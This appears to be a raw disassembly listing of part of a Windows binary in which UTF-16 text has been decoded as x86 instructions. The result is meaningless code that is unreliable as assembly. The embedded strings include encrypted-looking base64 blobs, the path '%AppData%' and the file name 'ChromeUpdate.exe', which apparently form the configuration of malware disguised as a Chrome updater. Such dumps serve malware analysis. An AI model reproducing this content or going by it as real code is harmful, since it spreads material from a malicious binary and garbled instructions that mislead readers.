  409dfb:	61                   	popa
  409dfc:	00 77 00             	add    %dh,0x0(%edi)
  409dff:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409e04:	80 b1 2f 00 68 00 6f 	xorb   $0x6f,0x68002f(%ecx)
  409e0b:	00 62 00             	add    %ah,0x0(%edx)
  409e0e:	42                   	inc    %edx
  409e0f:	00 4b 00             	add    %cl,0x0(%ebx)
  409e12:	2f                   	das
  409e13:	00 33                	add    %dh,(%ebx)
  409e15:	00 46 00             	add    %al,0x0(%esi)
  409e18:	50                   	push   %eax
  409e19:	00 4b 00             	add    %cl,0x0(%ebx)
  409e1c:	49                   	dec    %ecx
  409e1d:	00 30                	add    %dh,(%eax)
  409e1f:	00 6a 00             	add    %ch,0x0(%edx)
  409e22:	72 00                	jb     0x409e24
  409e24:	39 00                	cmp    %eax,(%eax)
  409e26:	71 00                	jno    0x409e28
  409e28:	36 00 31             	add    %dh,%ss:(%ecx)
  409e2b:	00 58 00             	add    %bl,0x0(%eax)
  409e2e:	55                   	push   %ebp
  409e2f:	00 4f 00             	add    %cl,0x0(%edi)
  409e32:	69 00 69 00 4f 00    	imul   $0x4f0069,(%eax),%eax
  409e38:	35 00 4f 00 77       	xor    $0x77004f00,%eax
  409e3d:	00 65 00             	add    %ah,0x0(%ebp)
  409e40:	70 00                	jo     0x409e42
  409e42:	6c                   	insb   (%dx),%es:(%edi)
  409e43:	00 38                	add    %bh,(%eax)
  409e45:	00 38                	add    %bh,(%eax)
  409e47:	00 4a 00             	add    %cl,0x0(%edx)
  409e4a:	30 00                	xor    %al,(%eax)
  409e4c:	6f                   	outsl  %ds:(%esi),(%dx)
  409e4d:	00 49 00             	add    %cl,0x0(%ecx)
  409e50:	62 00                	bound  %eax,(%eax)
  409e52:	39 00                	cmp    %eax,(%eax)
  409e54:	30 00                	xor    %al,(%eax)
  409e56:	78 00                	js     0x409e58
  409e58:	5a                   	pop    %edx
  409e59:	00 71 00             	add    %dh,0x0(%ecx)
  409e5c:	4f                   	dec    %edi
  409e5d:	00 5a 00             	add    %bl,0x0(%edx)
  409e60:	70 00                	jo     0x409e62
  409e62:	6d                   	insl   (%dx),%es:(%edi)
  409e63:	00 35 00 62 00 66    	add    %dh,0x66006200
  409e69:	00 62 00             	add    %ah,0x0(%edx)
  409e6c:	6f                   	outsl  %ds:(%esi),(%dx)
  409e6d:	00 6a 00             	add    %ch,0x0(%edx)
  409e70:	4f                   	dec    %edi
  409e71:	00 34 00             	add    %dh,(%eax,%eax,1)
  409e74:	52                   	push   %edx
  409e75:	00 31                	add    %dh,(%ecx)
  409e77:	00 39                	add    %bh,(%ecx)
  409e79:	00 4d 00             	add    %cl,0x0(%ebp)
  409e7c:	48                   	dec    %eax
  409e7d:	00 38                	add    %bh,(%eax)
  409e7f:	00 69 00             	add    %ch,0x0(%ecx)
  409e82:	71 00                	jno    0x409e84
  409e84:	30 00                	xor    %al,(%eax)
  409e86:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  409e8a:	61                   	popa
  409e8b:	00 73 00             	add    %dh,0x0(%ebx)
  409e8e:	77 00                	ja     0x409e90
  409e90:	6f                   	outsl  %ds:(%esi),(%dx)
  409e91:	00 37                	add    %dh,(%edi)
  409e93:	00 70 00             	add    %dh,0x0(%eax)
  409e96:	4a                   	dec    %edx
  409e97:	00 73 00             	add    %dh,0x0(%ebx)
  409e9a:	53                   	push   %ebx
  409e9b:	00 52 00             	add    %dl,0x0(%edx)
  409e9e:	48                   	dec    %eax
  409e9f:	00 56 00             	add    %dl,0x0(%esi)
  409ea2:	5a                   	pop    %edx
  409ea3:	00 79 00             	add    %bh,0x0(%ecx)
  409ea6:	41                   	inc    %ecx
  409ea7:	00 2f                	add    %ch,(%edi)
  409ea9:	00 37                	add    %dh,(%edi)
  409eab:	00 6f 00             	add    %ch,0x0(%edi)
  409eae:	4a                   	dec    %edx
  409eaf:	00 67 00             	add    %ah,0x0(%edi)
  409eb2:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409eb7:	13 25 00 41 00 70    	adc    0x70004100,%esp
  409ebd:	00 70 00             	add    %dh,0x0(%eax)
  409ec0:	44                   	inc    %esp
  409ec1:	00 61 00             	add    %ah,0x0(%ecx)
  409ec4:	74 00                	je     0x409ec6
  409ec6:	61                   	popa
  409ec7:	00 25 00 00 21 43    	add    %ah,0x43210000
  409ecd:	00 68 00             	add    %ch,0x0(%eax)
  409ed0:	72 00                	jb     0x409ed2
  409ed2:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed3:	00 6d 00             	add    %ch,0x0(%ebp)
  409ed6:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  409eda:	70 00                	jo     0x409edc
  409edc:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409ee0:	74 00                	je     0x409ee2
  409ee2:	65 00 2e             	add    %ch,%gs:(%esi)
  409ee5:	00 65 00             	add    %ah,0x0(%ebp)
  409ee8:	78 00                	js     0x409eea
  409eea:	65 00 00             	add    %al,%gs:(%eax)
  409eed:	59                   	pop    %ecx
  409eee:	55                   	push   %ebp
  409eef:	00 33                	add    %dh,(%ebx)
  409ef1:	00 52 00             	add    %dl,0x0(%edx)
  409ef4:	5a                   	pop    %edx
  409ef5:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  409ef9:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  409efd:	00 63 00             	add    %ah,0x0(%ebx)
  409f00:	57                   	push   %edi
  409f01:	00 49 00             	add    %cl,0x0(%ecx)
  409f04:	77 00                	ja     0x409f06
  409f06:	57                   	push   %edi
  409f07:	00 55 00             	add    %dl,0x0(%ebp)
  409f0a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409f0e:	51                   	push   %ecx
  409f0f:	00 56 00             	add    %dl,0x0(%esi)
  409f12:	5a                   	pop    %edx
  409f13:	00 4f 00             	add    %cl,0x0(%edi)
  409f16:	59                   	pop    %ecx
  409f17:	00 6e 00             	add    %ch,0x0(%esi)
  409f1a:	6c                   	insb   (%dx),%es:(%edi)
  409f1b:	00 52 00             	add    %dl,0x0(%edx)
  409f1e:	54                   	push   %esp
  409f1f:	00 58 00             	add    %bl,0x0(%eax)
  409f22:	42                   	inc    %edx
  409f23:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  409f27:	00 30                	add    %dh,(%eax)
  409f29:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f2c:	77 00                	ja     0x409f2e
  409f2e:	57                   	push   %edi
  409f2f:	00 56 00             	add    %dl,0x0(%esi)
  409f32:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  409f36:	53                   	push   %ebx
  409f37:	00 47 00             	add    %al,0x0(%edi)
  409f3a:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  409f3e:	65 00 6c 00 59       	add    %ch,%gs:0x59(%eax,%eax,1)
  409f43:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  409f49:	30 00                	xor    %al,(%eax)
  409f4b:	55                   	push   %ebp
  409f4c:	00 61 00             	add    %ah,0x0(%ecx)
  409f4f:	71 00                	jno    0x409f51
  409f51:	42                   	inc    %edx
  409f52:	00 46 00             	add    %al,0x0(%esi)
  409f55:	2b 00                	sub    (%eax),%eax
  409f57:	6f                   	outsl  %ds:(%esi),(%dx)
  409f58:	00 73 00             	add    %dh,0x0(%ebx)
  409f5b:	32 00                	xor    (%eax),%al
  409f5d:	35 00 47 00 4b       	xor    $0x4b004700,%eax
  409f62:	00 65 00             	add    %ah,0x0(%ebp)
  409f65:	54                   	push   %esp
  409f66:	00 76 00             	add    %dh,0x0(%esi)
  409f69:	77 00                	ja     0x409f6b
  409f6b:	78 00                	js     0x409f6d
  409f6d:	30 00                	xor    %al,(%eax)
  409f6f:	74 00                	je     0x409f71
  409f71:	45                   	inc    %ebp
  409f72:	00 46 00             	add    %al,0x0(%esi)
  409f75:	73 00                	jae    0x409f77
  409f77:	37                   	aaa
  409f78:	00 38                	add    %bh,(%eax)
  409f7a:	00 47 00             	add    %al,0x0(%edi)
  409f7d:	5a                   	pop    %edx
  409f7e:	00 6e 00             	add    %ch,0x0(%esi)
  409f81:	4b                   	dec    %ebx
  409f82:	00 75 00             	add    %dh,0x0(%ebp)
  409f85:	68 00 44 00 32       	push   $0x32004400
  409f8a:	00 31                	add    %dh,(%ecx)
  409f8c:	00 6a 00             	add    %ch,0x0(%edx)
  409f8f:	4a                   	dec    %edx
  409f90:	00 4a 00             	add    %cl,0x0(%edx)
  409f93:	37                   	aaa
  409f94:	00 6a 00             	add    %ch,0x0(%edx)
  409f97:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  409f9b:	4f                   	dec    %edi
  409f9c:	00 78 00             	add    %bh,0x0(%eax)
  409f9f:	47                   	inc    %edi
  409fa0:	00 6b 00             	add    %ch,0x0(%ebx)
  409fa3:	34 00                	xor    $0x0,%al
  409fa5:	42                   	inc    %edx
  409fa6:	00 66 00             	add    %ah,0x0(%esi)
  409fa9:	50                   	push   %eax
  409faa:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  409fae:	00 66 00             	add    %ah,0x0(%esi)
  409fb1:	48                   	dec    %eax
  409fb2:	00 55 00             	add    %dl,0x0(%ebp)
  409fb5:	31 00                	xor    %eax,(%eax)
  409fb7:	45                   	inc    %ebp
  409fb8:	00 30                	add    %dh,(%eax)
  409fba:	00 45 00             	add    %al,0x0(%ebp)
  409fbd:	44                   	inc    %esp
  409fbe:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  409fc2:	00 32                	add    %dh,(%edx)
  409fc4:	00 45 00             	add    %al,0x0(%ebp)
  409fc7:	33 00                	xor    (%eax),%eax
  409fc9:	76 00                	jbe    0x409fcb
  409fcb:	5a                   	pop    %edx
  409fcc:	00 4d 00             	add    %cl,0x0(%ebp)
  409fcf:	70 00                	jo     0x409fd1
  409fd1:	76 00                	jbe    0x409fd3
  409fd3:	5a                   	pop    %edx
  409fd4:	00 6e 00             	add    %ch,0x0(%esi)
  409fd7:	69 00 45 00 69 00    	imul   $0x690045,(%eax),%eax
  409fdd:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  409fe1:	64 00 2b             	add    %ch,%fs:(%ebx)
  409fe4:	00 69 00             	add    %ch,0x0(%ecx)
  409fe7:	2b 00                	sub    (%eax),%eax
  409fe9:	6c                   	insb   (%dx),%es:(%edi)
  409fea:	00 56 00             	add    %dl,0x0(%esi)
  409fed:	59                   	pop    %ecx
  409fee:	00 69 00             	add    %ch,0x0(%ecx)
  409ff1:	39 00                	cmp    %eax,(%eax)
  409ff3:	41                   	inc    %ecx
  409ff4:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  409ffa:	92                   	xchg   %eax,%edx
  409ffb:	59                   	pop    %ecx
  409ffc:	36 00 77 00          	add    %dh,%ss:0x0(%edi)
  40a000:	35 00 6b 00 6e       	xor    $0x6e006b00,%eax
  40a005:	00 77 00             	add    %dh,0x0(%edi)
  40a008:	52                   	push   %edx
  40a009:	00 2f                	add    %ch,(%edi)
  40a00b:	00 42 00             	add    %al,0x0(%edx)
  40a00e:	45                   	inc    %ebp
  40a00f:	00 57 00             	add    %dl,0x0(%edi)
  40a012:	39 00                	cmp    %eax,(%eax)
  40a014:	6a 00                	push   $0x0
  40a016:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a01a:	75 00                	jne    0x40a01c
  40a01c:	44                   	inc    %esp
  40a01d:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40a021:	00 67 00             	add    %ah,0x0(%edi)
  40a024:	38 00                	cmp    %al,(%eax)
  40a026:	54                   	push   %esp
  40a027:	00 77 00             	add    %dh,0x0(%edi)
  40a02a:	50                   	push   %eax
  40a02b:	00 50 00             	add    %dl,0x0(%eax)
  40a02e:	59                   	pop    %ecx
  40a02f:	00 77 00             	add    %dh,0x0(%edi)
  40a032:	63 00                	arpl   %eax,(%eax)
  40a034:	55                   	push   %ebp
  40a035:	00 6c 00 4f          	add    %ch,0x4f(%eax,%eax,1)
  40a039:	00 35 00 6b 00 6c    	add    %dh,0x6c006b00
  40a03f:	00 62 00             	add    %ah,0x0(%edx)
  40a042:	6e                   	outsb  %ds:(%esi),(%dx)
  40a043:	00 6e 00             	add    %ch,0x0(%esi)
  40a046:	4f                   	dec    %edi
  40a047:	00 77 00             	add    %dh,0x0(%edi)
  40a04a:	62 00                	bound  %eax,(%eax)
  40a04c:	77 00                	ja     0x40a04e
  40a04e:	7a 00                	jp     0x40a050
  40a050:	73 00                	jae    0x40a052
  40a052:	30 00                	xor    %al,(%eax)
  40a054:	46                   	inc    %esi
  40a055:	00 4b 00             	add    %cl,0x0(%ebx)
  40a058:	6e                   	outsb  %ds:(%esi),(%dx)
  40a059:	00 50 00             	add    %dl,0x0(%eax)
  40a05c:	42                   	inc    %edx
  40a05d:	00 4e 00             	add    %cl,0x0(%esi)
  40a060:	63 00                	arpl   %eax,(%eax)
  40a062:	56                   	push   %esi
  40a063:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40a067:	00 2f                	add    %ch,(%edi)
  40a069:	00 6b 00             	add    %ch,0x0(%ebx)
  40a06c:	50                   	push   %eax
  40a06d:	00 70 00             	add    %dh,0x0(%eax)
  40a070:	4d                   	dec    %ebp
  40a071:	00 6b 00             	add    %ch,0x0(%ebx)
  40a074:	59                   	pop    %ecx
  40a075:	00 59 00             	add    %bl,0x0(%ecx)
  40a078:	66 00 32             	data16 add %dh,(%edx)
  40a07b:	00 7a 00             	add    %bh,0x0(%edx)
  40a07e:	33 00                	xor    (%eax),%eax
  40a080:	78 00                	js     0x40a082
  40a082:	42                   	inc    %edx
  40a083:	00 32                	add    %dh,(%edx)
  40a085:	00 41 00             	add    %al,0x0(%ecx)
  40a088:	49                   	dec    %ecx
  40a089:	00 61 00             	add    %ah,0x0(%ecx)
  40a08c:	4c                   	dec    %esp
  40a08d:	00 33                	add    %dh,(%ebx)
  40a08f:	00 2b                	add    %ch,(%ebx)
  40a091:	00 56 00             	add    %dl,0x0(%esi)
  40a094:	7a 00                	jp     0x40a096
  40a096:	49                   	dec    %ecx
  40a097:	00 56 00             	add    %dl,0x0(%esi)
  40a09a:	37                   	aaa
  40a09b:	00 59 00             	add    %bl,0x0(%ecx)
  40a09e:	4b                   	dec    %ebx
  40a09f:	00 4a 00             	add    %cl,0x0(%edx)
  40a0a2:	79 00                	jns    0x40a0a4
  40a0a4:	43                   	inc    %ebx
  40a0a5:	00 6a 00             	add    %ch,0x0(%edx)
  40a0a8:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40a0ac:	51                   	push   %ecx
  40a0ad:	00 48 00             	add    %cl,0x0(%eax)
  40a0b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0b1:	00 47 00             	add    %al,0x0(%edi)
  40a0b4:	2b 00                	sub    (%eax),%eax
  40a0b6:	53                   	push   %ebx
  40a0b7:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40a0bb:	00 79 00             	add    %bh,0x0(%ecx)
  40a0be:	41                   	inc    %ecx
  40a0bf:	00 77 00             	add    %dh,0x0(%edi)
  40a0c2:	48                   	dec    %eax
  40a0c3:	00 59 00             	add    %bl,0x0(%ecx)
  40a0c6:	43                   	inc    %ebx
  40a0c7:	00 6e 00             	add    %ch,0x0(%esi)
  40a0ca:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0cb:	00 2f                	add    %ch,(%edi)
  40a0cd:	00 41 00             	add    %al,0x0(%ecx)
  40a0d0:	76 00                	jbe    0x40a0d2
  40a0d2:	68 00 55 00 78       	push   $0x78005500
  40a0d7:	00 4f 00             	add    %cl,0x0(%edi)
  40a0da:	63 00                	arpl   %eax,(%eax)
  40a0dc:	41                   	inc    %ecx
  40a0dd:	00 46 00             	add    %al,0x0(%esi)
  40a0e0:	4c                   	dec    %esp
  40a0e1:	00 72 00             	add    %dh,0x0(%edx)
  40a0e4:	7a 00                	jp     0x40a0e6
  40a0e6:	44                   	inc    %esp
  40a0e7:	00 53 00             	add    %dl,0x0(%ebx)
  40a0ea:	33 00                	xor    (%eax),%eax
  40a0ec:	33 00                	xor    (%eax),%eax
  40a0ee:	31 00                	xor    %eax,(%eax)
  40a0f0:	69 00 6a 00 65 00    	imul   $0x65006a,(%eax),%eax
  40a0f6:	79 00                	jns    0x40a0f8
  40a0f8:	73 00                	jae    0x40a0fa
  40a0fa:	52                   	push   %edx
  40a0fb:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a0ff:	00 55 00             	add    %dl,0x0(%ebp)
  40a102:	34 00                	xor    $0x0,%al
  40a104:	61                   	popa
  40a105:	00 75 00             	add    %dh,0x0(%ebp)
  40a108:	52                   	push   %edx
  40a109:	00 46 00             	add    %al,0x0(%esi)
  40a10c:	32 00                	xor    (%eax),%al
  40a10e:	6a 00                	push   $0x0
  40a110:	4f                   	dec    %edi
  40a111:	00 48 00             	add    %cl,0x0(%eax)
  40a114:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40a118:	74 00                	je     0x40a11a
  40a11a:	45                   	inc    %ebp
  40a11b:	00 39                	add    %bh,(%ecx)
  40a11d:	00 72 00             	add    %dh,0x0(%edx)
  40a120:	30 00                	xor    %al,(%eax)
  40a122:	73 00                	jae    0x40a124
  40a124:	42                   	inc    %edx
  40a125:	00 51 00             	add    %dl,0x0(%ecx)
  40a128:	4e                   	dec    %esi
  40a129:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40a12d:	00 45 00             	add    %al,0x0(%ebp)
  40a130:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a133:	00 65 00             	add    %ah,0x0(%ebp)
  40a136:	7a 00                	jp     0x40a138
  40a138:	61                   	popa
  40a139:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40a13d:	00 38                	add    %bh,(%eax)
  40a13f:	00 6e 00             	add    %ch,0x0(%esi)
  40a142:	43                   	inc    %ebx
  40a143:	00 58 00             	add    %bl,0x0(%eax)
  40a146:	70 00                	jo     0x40a148
  40a148:	45                   	inc    %ebp
  40a149:	00 6e 00             	add    %ch,0x0(%esi)
  40a14c:	79 00                	jns    0x40a14e
  40a14e:	43                   	inc    %ebx
  40a14f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a152:	43                   	inc    %ebx
  40a153:	00 39                	add    %bh,(%ecx)
  40a155:	00 5a 00             	add    %bl,0x0(%edx)
  40a158:	68 00 78 00 45       	push   $0x45007800
  40a15d:	00 62 00             	add    %ah,0x0(%edx)
  40a160:	50                   	push   %eax
  40a161:	00 49 00             	add    %cl,0x0(%ecx)
  40a164:	49                   	dec    %ecx
  40a165:	00 73 00             	add    %dh,0x0(%ebx)
  40a168:	6a 00                	push   $0x0
  40a16a:	4f                   	dec    %edi
  40a16b:	00 70 00             	add    %dh,0x0(%eax)
  40a16e:	6d                   	insl   (%dx),%es:(%edi)
  40a16f:	00 6f 00             	add    %ch,0x0(%edi)
  40a172:	56                   	push   %esi
  40a173:	00 6a 00             	add    %ch,0x0(%edx)
  40a176:	79 00                	jns    0x40a178
  40a178:	4f                   	dec    %edi
  40a179:	00 79 00             	add    %bh,0x0(%ecx)
  40a17c:	75 00                	jne    0x40a17e
  40a17e:	53                   	push   %ebx
  40a17f:	00 70 00             	add    %dh,0x0(%eax)
  40a182:	6e                   	outsb  %ds:(%esi),(%dx)
  40a183:	00 2b                	add    %ch,(%ebx)
  40a185:	00 43 00             	add    %al,0x0(%ebx)
  40a188:	7a 00                	jp     0x40a18a
  40a18a:	4d                   	dec    %ebp
  40a18b:	00 68 00             	add    %ch,0x0(%eax)
  40a18e:	4b                   	dec    %ebx
  40a18f:	00 65 00             	add    %ah,0x0(%ebp)
  40a192:	48                   	dec    %eax
  40a193:	00 6d 00             	add    %ch,0x0(%ebp)
  40a196:	63 00                	arpl   %eax,(%eax)
  40a198:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40a19c:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a19f:	00 47 00             	add    %al,0x0(%edi)
  40a1a2:	6c                   	insb   (%dx),%es:(%edi)
  40a1a3:	00 4e 00             	add    %cl,0x0(%esi)
  40a1a6:	33 00                	xor    (%eax),%eax
  40a1a8:	68 00 2b 00 56       	push   $0x56002b00
  40a1ad:	00 6f 00             	add    %ch,0x0(%edi)
  40a1b0:	4a                   	dec    %edx
  40a1b1:	00 36                	add    %dh,(%esi)
  40a1b3:	00 4a 00             	add    %cl,0x0(%edx)
  40a1b6:	42                   	inc    %edx
  40a1b7:	00 37                	add    %dh,(%edi)
  40a1b9:	00 66 00             	add    %ah,0x0(%esi)
  40a1bc:	2b 00                	sub    (%eax),%eax
  40a1be:	61                   	popa
  40a1bf:	00 35 00 5a 00 79    	add    %dh,0x79005a00
  40a1c5:	00 67 00             	add    %ah,0x0(%edi)
  40a1c8:	69 00 6f 00 52 00    	imul   $0x52006f,(%eax),%eax
  40a1ce:	68 00 54 00 42       	push   $0x42005400
  40a1d3:	00 46 00             	add    %al,0x0(%esi)
  40a1d6:	41                   	inc    %ecx
  40a1d7:	00 68 00             	add    %ch,0x0(%eax)
  40a1da:	51                   	push   %ecx
  40a1db:	00 55 00             	add    %dl,0x0(%ebp)
  40a1de:	62 00                	bound  %eax,(%eax)
  40a1e0:	37                   	aaa
  40a1e1:	00 47 00             	add    %al,0x0(%edi)
  40a1e4:	33 00                	xor    (%eax),%eax
  40a1e6:	38 00                	cmp    %al,(%eax)
  40a1e8:	48                   	dec    %eax
  40a1e9:	00 6e 00             	add    %ch,0x0(%esi)
  40a1ec:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40a1f0:	72 00                	jb     0x40a1f2
  40a1f2:	55                   	push   %ebp
  40a1f3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1f6:	39 00                	cmp    %eax,(%eax)
  40a1f8:	5a                   	pop    %edx
  40a1f9:	00 33                	add    %dh,(%ebx)
  40a1fb:	00 48 00             	add    %cl,0x0(%eax)
  40a1fe:	66 00 58 00          	data16 add %bl,0x0(%eax)
  40a202:	74 00                	je     0x40a204
  40a204:	53                   	push   %ebx
  40a205:	00 66 00             	add    %ah,0x0(%esi)
  40a208:	42                   	inc    %edx
  40a209:	00 48 00             	add    %cl,0x0(%eax)
  40a20c:	4e                   	dec    %esi
  40a20d:	00 68 00             	add    %ch,0x0(%eax)
  40a210:	62 00                	bound  %eax,(%eax)
  40a212:	53                   	push   %ebx
  40a213:	00 2f                	add    %ch,(%edi)
  40a215:	00 66 00             	add    %ah,0x0(%esi)
  40a218:	2f                   	das
  40a219:	00 59 00             	add    %bl,0x0(%ecx)
  40a21c:	53                   	push   %ebx
  40a21d:	00 48 00             	add    %cl,0x0(%eax)
  40a220:	72 00                	jb     0x40a222
  40a222:	32 00                	xor    (%eax),%al
  40a224:	51                   	push   %ecx
  40a225:	00 61 00             	add    %ah,0x0(%ecx)
  40a228:	43                   	inc    %ebx
  40a229:	00 5a 00             	add    %bl,0x0(%edx)
  40a22c:	5a                   	pop    %edx
  40a22d:	00 67 00             	add    %ah,0x0(%edi)
  40a230:	7a 00                	jp     0x40a232
  40a232:	62 00                	bound  %eax,(%eax)
  40a234:	73 00                	jae    0x40a236
  40a236:	5a                   	pop    %edx
  40a237:	00 63 00             	add    %ah,0x0(%ebx)
  40a23a:	35 00 61 00 67       	xor    $0x67006100,%eax
  40a23f:	00 45 00             	add    %al,0x0(%ebp)
  40a242:	47                   	inc    %edi
  40a243:	00 58 00             	add    %bl,0x0(%eax)
  40a246:	79 00                	jns    0x40a248
  40a248:	42                   	inc    %edx
  40a249:	00 6f 00             	add    %ch,0x0(%edi)
  40a24c:	71 00                	jno    0x40a24e
  40a24e:	7a 00                	jp     0x40a250
  40a250:	51                   	push   %ecx
  40a251:	00 57 00             	add    %dl,0x0(%edi)
  40a254:	31 00                	xor    %eax,(%eax)
  40a256:	4c                   	dec    %esp
  40a257:	00 77 00             	add    %dh,0x0(%edi)
  40a25a:	74 00                	je     0x40a25c
  40a25c:	32 00                	xor    (%eax),%al
  40a25e:	30 00                	xor    %al,(%eax)
  40a260:	43                   	inc    %ebx
  40a261:	00 71 00             	add    %dh,0x0(%ecx)
  40a264:	30 00                	xor    %al,(%eax)
  40a266:	62 00                	bound  %eax,(%eax)
  40a268:	31 00                	xor    %eax,(%eax)
  40a26a:	6b 00 63             	imul   $0x63,(%eax),%eax
  40a26d:	00 37                	add    %dh,(%edi)
  40a26f:	00 55 00             	add    %dl,0x0(%ebp)
  40a272:	42                   	inc    %edx
  40a273:	00 7a 00             	add    %bh,0x0(%edx)
  40a276:	43                   	inc    %ebx
  40a277:	00 4d 00             	add    %cl,0x0(%ebp)
  40a27a:	62 00                	bound  %eax,(%eax)
  40a27c:	70 00                	jo     0x40a27e
  40a27e:	4e                   	dec    %esi
  40a27f:	00 59 00             	add    %bl,0x0(%ecx)
  40a282:	66 00 31             	data16 add %dh,(%ecx)
  40a285:	00 41 00             	add    %al,0x0(%ecx)
  40a288:	6f                   	outsl  %ds:(%esi),(%dx)
  40a289:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
  40a28d:	00 31                	add    %dh,(%ecx)
  40a28f:	00 41 00             	add    %al,0x0(%ecx)
  40a292:	57                   	push   %edi
  40a293:	00 33                	add    %dh,(%ebx)
  40a295:	00 77 00             	add    %dh,0x0(%edi)
  40a298:	30 00                	xor    %al,(%eax)
  40a29a:	2f                   	das
  40a29b:	00 59 00             	add    %bl,0x0(%ecx)
  40a29e:	55                   	push   %ebp
  40a29f:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40a2a3:	00 48 00             	add    %cl,0x0(%eax)
  40a2a6:	37                   	aaa
  40a2a7:	00 68 00             	add    %ch,0x0(%eax)
  40a2aa:	4b                   	dec    %ebx
  40a2ab:	00 31                	add    %dh,(%ecx)
  40a2ad:	00 6e 00             	add    %ch,0x0(%esi)
  40a2b0:	4f                   	dec    %edi
  40a2b1:	00 51 00             	add    %dl,0x0(%ecx)
  40a2b4:	47                   	inc    %edi
  40a2b5:	00 4f 00             	add    %cl,0x0(%edi)
  40a2b8:	56                   	push   %esi
  40a2b9:	00 66 00             	add    %ah,0x0(%esi)
  40a2bc:	63 00                	arpl   %eax,(%eax)
  40a2be:	56                   	push   %esi
  40a2bf:	00 37                	add    %dh,(%edi)
  40a2c1:	00 38                	add    %bh,(%eax)
  40a2c3:	00 39                	add    %bh,(%ecx)
  40a2c5:	00 69 00             	add    %ch,0x0(%ecx)
  40a2c8:	69 00 5a 00 45 00    	imul   $0x45005a,(%eax),%eax
  40a2ce:	37                   	aaa
  40a2cf:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2d2:	38 00                	cmp    %al,(%eax)
  40a2d4:	52                   	push   %edx
  40a2d5:	00 33                	add    %dh,(%ebx)
  40a2d7:	00 58 00             	add    %bl,0x0(%eax)
  40a2da:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a2de:	57                   	push   %edi
  40a2df:	00 63 00             	add    %ah,0x0(%ebx)
  40a2e2:	75 00                	jne    0x40a2e4
  40a2e4:	57                   	push   %edi
  40a2e5:	00 64 00 70          	add    %ah,0x70(%eax,%eax,1)
  40a2e9:	00 56 00             	add    %dl,0x0(%esi)
  40a2ec:	4b                   	dec    %ebx
  40a2ed:	00 78 00             	add    %bh,0x0(%eax)
  40a2f0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a2f4:	31 00                	xor    %eax,(%eax)
  40a2f6:	35 00 65 00 70       	xor    $0x70006500,%eax
  40a2fb:	00 56 00             	add    %dl,0x0(%esi)
  40a2fe:	58                   	pop    %eax
  40a2ff:	00 68 00             	add    %ch,0x0(%eax)
  40a302:	38 00                	cmp    %al,(%eax)
  40a304:	37                   	aaa
  40a305:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40a309:	00 32                	add    %dh,(%edx)
  40a30b:	00 55 00             	add    %dl,0x0(%ebp)
  40a30e:	42                   	inc    %edx
  40a30f:	00 5a 00             	add    %bl,0x0(%edx)
  40a312:	66 00 46 00          	data16 add %al,0x0(%esi)
  40a316:	2b 00                	sub    (%eax),%eax
  40a318:	31 00                	xor    %eax,(%eax)
  40a31a:	53                   	push   %ebx
  40a31b:	00 32                	add    %dh,(%edx)
  40a31d:	00 35 00 49 00 46    	add    %dh,0x46004900
  40a323:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40a327:	00 36                	add    %dh,(%esi)
  40a329:	00 68 00             	add    %ch,0x0(%eax)
  40a32c:	4e                   	dec    %esi
  40a32d:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a331:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40a335:	00 30                	add    %dh,(%eax)
  40a337:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40a33b:	00 37                	add    %dh,(%edi)
  40a33d:	00 78 00             	add    %bh,0x0(%eax)
  40a340:	59                   	pop    %ecx
  40a341:	00 52 00             	add    %dl,0x0(%edx)
  40a344:	2b 00                	sub    (%eax),%eax
  40a346:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40a349:	00 71 00             	add    %dh,0x0(%ecx)
  40a34c:	46                   	inc    %esi
  40a34d:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40a351:	00 6a 00             	add    %ch,0x0(%edx)
  40a354:	53                   	push   %ebx
  40a355:	00 4b 00             	add    %cl,0x0(%ebx)
  40a358:	59                   	pop    %ecx
  40a359:	00 50 00             	add    %dl,0x0(%eax)
  40a35c:	4d                   	dec    %ebp
  40a35d:	00 78 00             	add    %bh,0x0(%eax)
